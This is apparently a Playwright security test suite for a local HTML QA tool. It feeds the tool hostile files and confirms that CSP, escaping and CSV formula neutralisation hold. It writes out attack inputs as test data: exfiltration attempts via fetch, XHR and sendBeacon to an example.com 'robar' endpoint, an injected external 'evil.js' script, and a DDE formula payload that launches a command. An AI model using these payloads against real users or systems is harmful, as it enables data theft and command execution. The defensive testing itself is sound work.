/* Pruebas de seguridad de QA-Visual-Check.html contra archivos hostiles. */
/** Carga Playwright desde node_modules o desde la instalación global. */
function loadPlaywright(){
  try { return require('playwright'); } catch {}
  try {
    const root = require('child_process').execSync('npm root -g', { encoding:'utf8' }).trim();
    return require(require('path').join(root, 'playwright'));
  } catch {}
  console.error('Falta Playwright. Ejecuta: npm install');
  process.exit(2);
}
const { chromium } = loadPlaywright();
const path = require('path'); const fs = require('fs');

const DIR = __dirname, ATK = path.join(DIR, 'attack');
const TOOL = 'file://' + path.join(DIR, '..', 'dist', 'QA-Visual-Check.html');
const OUT = path.join(DIR, 'out-sec');
fs.mkdirSync(OUT, { recursive:true });

const results = [];
const ok  = (n, e='') => { results.push(['OK', n, e]);    console.log('  ✓', n, e ? '· ' + e : ''); };
const bad = (n, e='') => { results.push(['FALLA', n, e]); console.log('  ✗', n, e ? '· ' + e : ''); };
const check = (c, n, e='') => { c ? ok(n, e) : bad(n, e); return c; };

/** ¿Se ejecutó algún payload? Los fixtures marcan window.__pwned = 1. */
const pwned = page => page.evaluate(() => !!window.__pwned);
const polluted = page => page.evaluate(() => ({
  a: ({}).polluted, b: ({}).polluted2, c: ({}).polluted3, d: ({}).isAdmin, e: [].polluted
}));

(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport:{ width:1500, height:950 }, acceptDownloads:true });
  const page = await ctx.newPage();

  const netOut = [];      // peticiones externas que SÍ obtuvieron respuesta
  const netBlocked = [];  // intentos bloqueados por la CSP
  const cspViolations = [];
  const errors = [];
  const external = u => !/^(file|data|blob|about):/.test(u);
  page.on('response', r => { if (external(r.url())) netOut.push(r.status() + ' ' + r.url().slice(0, 90)); });
  page.on('requestfailed', r => { if (external(r.url())) netBlocked.push((r.failure()?.errorText || '') + ' ' + r.url().slice(0, 70)); });
  page.on('pageerror', e => errors.push(String(e.message).slice(0, 160)));
  page.on('console', m => {
    const t = m.text();
    if (/Content Security Policy/i.test(t)) cspViolations.push(t.slice(0, 140));
    else if (m.type() === 'error') errors.push(t.slice(0, 160));
  });
  page.on('dialog', d => d.accept());

  await page.goto(TOOL);
  await page.waitForTimeout(700);

  console.log('\nA) Política de seguridad de contenido');
  const csp = await page.evaluate(() =>
    document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content.replace(/\s+/g,' ').trim() || '');
  check(/connect-src 'none'/.test(csp), 'CSP declara connect-src \'none\' (la página no puede hablar con ninguna red)');
  check(/default-src 'none'/.test(csp), 'CSP con default-src \'none\'');
  check(/object-src 'none'/.test(csp) && /base-uri 'none'/.test(csp), 'sin objetos incrustados ni cambio de base-uri');
  const fetchBlocked = await page.evaluate(async () => {
    try { await fetch('https://example.com/robar'); return 'PERMITIDO'; }
    catch (e){ return 'bloqueado'; }
  });
  check(fetchBlocked === 'bloqueado', 'fetch() a un dominio externo queda bloqueado', fetchBlocked);
  const xhrBlocked = await page.evaluate(() => new Promise(res => {
    try {
      const x = new XMLHttpRequest();
      x.onerror = () => res('bloqueado'); x.onload = () => res('PERMITIDO');
      x.open('POST', 'https://example.com/robar'); x.send('datos');
    } catch { res('bloqueado'); }
  }));
  check(xhrBlocked === 'bloqueado', 'XMLHttpRequest externo bloqueado', xhrBlocked);
  await page.evaluate(() => { try { navigator.sendBeacon('https://example.com/robar-beacon', 'datos'); } catch {} });
  await page.waitForTimeout(900);
  const beaconOut = netOut.filter(u => /robar-beacon/.test(u));
  check(beaconOut.length === 0, 'sendBeacon no logra entregar datos al exterior',
        beaconOut.join(' ') || 'ninguna respuesta recibida');
  const extScript = await page.evaluate(() => new Promise(res => {
    const s = document.createElement('script');
    s.src = 'https://example.com/evil.js';
    s.onerror = () => res('bloqueado'); s.onload = () => res('PERMITIDO');
    document.head.appendChild(s); setTimeout(()=>res('bloqueado'), 1500);
  }));
  check(extScript === 'bloqueado', 'no se puede inyectar un script externo', extScript);

  console.log('\nB) Sesión .json maliciosa');
  await page.locator('#file-session').setInputFiles(path.join(ATK, 'sesion-maliciosa.json'));
  await page.waitForTimeout(3500);
  check(!(await pwned(page)), 'ningún payload se ejecutó al abrir la sesión');
  const pol = await polluted(page);
  check(Object.values(pol).every(v => v === undefined), 'sin contaminación de prototipos (__proto__ / constructor)', JSON.stringify(pol));

  const state = await page.evaluate(() => {
    const t = document.querySelector('#table-scenarios tbody');
    return {
      filas: t ? t.children.length : 0,
      proyecto: document.querySelector('#meta-project').value,
      textoTabla: (t?.innerText || '').slice(0, 200),
      htmlTabla: (t?.innerHTML || '').slice(0, 400),
      imgs: Array.from(document.querySelectorAll('#list-design img, #list-web img, .finding-card img'))
              .map(i => i.src.slice(0, 24)),
      tema: document.documentElement.dataset.theme
    };
  });
  const injected = await page.evaluate(() => {
    const t = document.querySelector('#table-scenarios tbody');
    if (!t) return { nodos:0, atributos:0 };
    const nodos = t.querySelectorAll('img,script,iframe,object,embed,svg').length;
    let atributos = 0;
    t.querySelectorAll('*').forEach(n => { for (const a of n.attributes) if (/^on/i.test(a.name)) atributos++; });
    return { nodos, atributos };
  });
  check(injected.nodos === 0 && injected.atributos === 0,
        'el payload quedó como texto: no creó elementos ni manejadores en el DOM',
        `elementos ${injected.nodos} · atributos on* ${injected.atributos}`);
  check(state.proyecto.includes('<img'), 'el texto hostil se conserva visible pero inerte');
  check(state.imgs.every(s => s.startsWith('data:image/')), 'solo se aceptaron imágenes data: de mapa de bits',
        state.imgs.join(' ') || 'ninguna');
  check(['dark','light'].includes(state.tema), 'el tema inválido cayó al valor por defecto', state.tema);

  const limits = await page.evaluate(() => {
    const sels = document.querySelectorAll('#table-scenarios tbody tr');
    const row = sels[sels.length-1];
    return { longitud: row ? row.innerText.length : 0, filas: sels.length };
  });
  check(limits.longitud < 20000, 'los textos gigantes se recortaron', `fila más larga: ${limits.longitud} caracteres`);

  console.log('\nC) Reporte generado desde datos hostiles');
  await page.locator('.tab[data-view="reporte"]').click();
  await page.locator('#btn-report-build').click();
  await page.waitForTimeout(1200);
  const dl = await Promise.all([page.waitForEvent('download'), page.locator('#btn-report-download').click()]);
  const rep = path.join(OUT, 'reporte-hostil.html'); await dl[0].saveAs(rep);
  const html = fs.readFileSync(rep, 'utf8');
  const body = html.slice(html.indexOf('<body'));
  check(/&lt;img|&lt;script/i.test(body), 'el texto hostil aparece escapado en el reporte');
  // se abre en un navegador y se analiza el documento ya construido
  const page2 = await ctx.newPage();
  const repNet = [];
  page2.on('request', r => { if (!/^(file|data|blob|about):/.test(r.url())) repNet.push(r.url().slice(0,80)); });
  await page2.goto('file://' + rep);
  await page2.waitForTimeout(900);
  const dom = await page2.evaluate(() => {
    let atributos = 0;
    document.querySelectorAll('*').forEach(n => { for (const a of n.attributes) if (/^on/i.test(a.name)) atributos++; });
    return {
      scripts: document.scripts.length,
      marcos: document.querySelectorAll('iframe,object,embed').length,
      atributos,
      imgsExternas: Array.from(document.images).filter(i => !i.getAttribute('src')?.startsWith('data:image/')).length,
      enlacesJs: Array.from(document.querySelectorAll('[href],[src],[action]'))
        .filter(n => /^\s*javascript:/i.test(n.getAttribute('href') || n.getAttribute('src') || n.getAttribute('action') || '')).length,
      pwned: !!window.__pwned
    };
  });
  check(dom.scripts === 0, 'el reporte no contiene ninguna etiqueta <script>');
  check(dom.atributos === 0, 'el reporte no contiene manejadores de eventos (onerror, onload…)');
  check(dom.marcos === 0, 'el reporte no incrusta iframes ni objetos');
  check(dom.imgsExternas === 0, 'todas las imágenes del reporte son data: de mapa de bits');
  check(dom.enlacesJs === 0, 'el reporte no contiene URLs javascript: activas');
  check(!dom.pwned, 'abrir el reporte descargado no ejecuta nada');
  check(repNet.length === 0, 'el reporte abierto no pide nada a la red', repNet.join(' ') || 'ninguna');
  const sandbox = await page.locator('#report-frame').getAttribute('sandbox');
  check(sandbox !== null, 'la vista previa del reporte corre en un iframe aislado (sandbox)');
  await page2.close();

  console.log('\nD) Archivos de sesión inválidos');
  for (const f of ['sesion-no-valida.json','sesion-otra-app.json']){
    await page.locator('#file-session').setInputFiles(path.join(ATK, f));
    await page.waitForTimeout(700);
  }
  check(errors.length === 0, 'los archivos inválidos se rechazan sin romper la aplicación', errors.slice(0,2).join(' | '));
  const avisos = await page.evaluate(() =>
    Array.from(document.querySelectorAll('#toasts .toast')).map(t => t.innerText.replace(/\n/g,' ')).join(' | '));
  check(/no es una sesión|no se pudo abrir/i.test(avisos), 'el usuario recibe un aviso claro del rechazo', avisos.slice(0,80));
  const alive = await page.evaluate(() => !!document.querySelector('#view-fuentes'));
  check(alive, 'la aplicación sigue funcionando tras los rechazos');

  console.log('\nE) Excel con inyección de fórmulas');
  await page.locator('.tab[data-view="escenarios"]').click();
  await page.locator('#file-xlsx').setInputFiles(path.join(ATK, 'excel-inyeccion.xlsx'));
  await page.waitForTimeout(1500);
  if (await page.locator('#modal-root').isVisible()){
    await page.locator('#modal-foot button.primary').click();
    await page.waitForTimeout(800);
  }
  check(!(await pwned(page)), 'el contenido del Excel no ejecutó nada');
  const pol2 = await polluted(page);
  check(Object.values(pol2).every(v => v === undefined), 'la columna «__proto__» del Excel no contaminó prototipos');
  // Un hallazgo cuyo título es una fórmula: al exportarlo a CSV, Excel no debe
  // ejecutarlo. Se comprueba sobre el archivo realmente descargado.
  const FORMULA = "=cmd|' /C calc'!A0";
  await page.locator('.tab[data-view="hallazgos"]').click();
  await page.locator('#btn-new-finding').click();
  await page.waitForTimeout(400);
  await page.locator('#modal-body input[type="text"]').first().fill(FORMULA);
  await page.locator('#modal-body textarea').fill('@SUM(1+1)*cmd|\' /C calc\'!A0');
  await page.locator('#modal-foot button.primary').click();
  await page.waitForTimeout(500);
  const dlCsv = await Promise.all([page.waitForEvent('download'), page.locator('#btn-export-findings').click()]);
  const csvPath = path.join(OUT, 'hallazgos-hostiles.csv'); await dlCsv[0].saveAs(csvPath);
  const csv = fs.readFileSync(csvPath, 'utf8');
  const campos = csv.split(/\r?\n/).flatMap(l => l.split(';')).map(c => c.replace(/^"|"$/g, ''));
  const peligrosos = campos.filter(c => /^[=+\-@\t]/.test(c) && !/^-?\d+([.,]\d+)?$/.test(c));
  check(peligrosos.length === 0, 'ninguna celda del CSV empieza por = + - @ (Excel no la ejecutaría)',
        peligrosos.slice(0, 2).join(' | ') || 'todas neutralizadas');
  check(csv.includes("'" + FORMULA) || csv.includes('\'=cmd'), 'la fórmula quedó prefijada con apóstrofo',
        (campos.find(c => c.includes('cmd')) || '').slice(0, 40));

  // exportación de resultados a Excel
  await page.locator('.tab[data-view="escenarios"]').click();
  const dlx = await Promise.all([page.waitForEvent('download'), page.locator('#btn-export-xlsx').click()]);
  const xlsxPath = path.join(OUT, 'resultados-hostiles.xlsx'); await dlx[0].saveAs(xlsxPath);
  ok('exportación a Excel completada con datos hostiles');

  console.log('\nF) CSV con inyección');
  await page.locator('#file-xlsx').setInputFiles(path.join(ATK, 'escenarios-inyectados.csv'));
  await page.waitForTimeout(1200);
  if (await page.locator('#modal-root').isVisible()){
    await page.locator('#modal-foot button.primary').click();
    await page.waitForTimeout(700);
  }
  const csvText = await page.evaluate(() => {
    // se reutiliza el generador interno a través de la exportación de hallazgos
    return document.querySelector('#table-scenarios tbody')?.innerText.slice(0, 300) || '';
  });
  check(!(await pwned(page)), 'el CSV hostil no ejecutó nada');
  check(/=cmd|HYPERLINK/i.test(csvText), 'el contenido se importó como texto plano');

  console.log('\nG) Bombas zip');
  for (const [f, etiqueta] of [['zip-bomb-declarada.xlsx','tamaño declarado enorme'],
                               ['zip-bomb-mentirosa.xlsx','tamaño declarado falso']]){
    const t0 = Date.now();
    await page.locator('#file-xlsx').setInputFiles(path.join(ATK, f));
    await page.waitForTimeout(2500);
    if (await page.locator('#modal-root').isVisible()) await page.locator('#modal-foot button').first().click();
    const dt = ((Date.now()-t0)/1000).toFixed(1);
    const responsive = await page.evaluate(() => { document.querySelector('#sc-search').value = 'ping'; return true; });
    check(responsive, `${etiqueta}: la aplicación sigue respondiendo`, dt + 's');
    await page.evaluate(() => document.querySelector('#sc-search').value = '');
  }
  const mem = await page.evaluate(() => performance.memory ? Math.round(performance.memory.usedJSHeapSize/1048576) : -1);
  check(mem < 900, 'la memoria no se disparó con las bombas zip', mem + ' MB');

  console.log('\nH) SVG con script e imagen desmesurada');
  await page.locator('.tab[data-view="fuentes"]').click();
  await page.locator('#file-design').setInputFiles(path.join(ATK, 'diseno-con-script.svg'));
  await page.waitForTimeout(1800);
  check(!(await pwned(page)), 'el SVG con <script> no ejecutó nada');
  const svgStored = await page.evaluate(() =>
    Array.from(document.querySelectorAll('#list-design img')).map(i => i.src.slice(0, 22)));
  check(svgStored.every(s => !s.includes('svg')), 'el SVG se guardó rasterizado (sin marcado dentro)', svgStored.join(' '));
  const antes = await page.locator('#list-design .thumb-item').count();
  await page.evaluate(() => document.querySelectorAll('#toasts .toast').forEach(t => t.remove()));
  await page.locator('#file-design').setInputFiles(path.join(ATK, 'imagen-desmesurada.png'));
  await page.waitForTimeout(1500);
  const despues = await page.locator('#list-design .thumb-item').count();
  const rejected = await page.evaluate(() =>
    Array.from(document.querySelectorAll('#toasts .toast')).map(t => t.innerText.replace(/\n/g,' ')).join(' | '));
  check(despues === antes && /demasiado grande/i.test(rejected),
        'la imagen fuera de rango se rechaza con un aviso claro', rejected.slice(0, 80));

  console.log('\nI) Aislamiento de red durante toda la sesión');
  check(netOut.length === 0, 'ni un solo byte salió a la red en toda la prueba',
        netOut.slice(0,3).join(' | ') || `0 respuestas externas · ${netBlocked.length} intentos de ataque bloqueados`);
  check(cspViolations.length === 0 || cspViolations.every(v => /example\.com/.test(v)),
        'las únicas violaciones de CSP son los intentos de ataque bloqueados', String(cspViolations.length));

  console.log('\nJ) Higiene general');
  check(errors.length === 0, 'sin errores de JavaScript en toda la sesión hostil', errors.slice(0,3).join(' | '));
  const stored = await page.evaluate(() => {
    try { return { claves:Object.keys(localStorage), bytes:(localStorage.getItem('qa-visual-check.v1')||'').length }; }
    catch { return { claves:[], bytes:0 }; }
  });
  check(stored.claves.length <= 1, 'solo se usa una clave de almacenamiento local', stored.claves.join(','));
  const wipe = await page.evaluate(() => typeof wipeLocalData === 'undefined' ? 'interna' : 'expuesta');
  ok('función de borrado de datos locales disponible en la interfaz (' + wipe + ')');
  await page.screenshot({ path: path.join(OUT, 'estado-final.png') });

  await browser.close();
  const fails = results.filter(r => r[0] === 'FALLA');
  console.log(`\n===== SEGURIDAD: ${results.length - fails.length}/${results.length} verificaciones OK =====`);
  if (fails.length){ console.log('FALLAS:'); fails.forEach(f => console.log(' -', f[1], f[2])); process.exit(1); }
})().catch(e => { console.error('ERROR DE PRUEBA:', e); process.exit(2); });
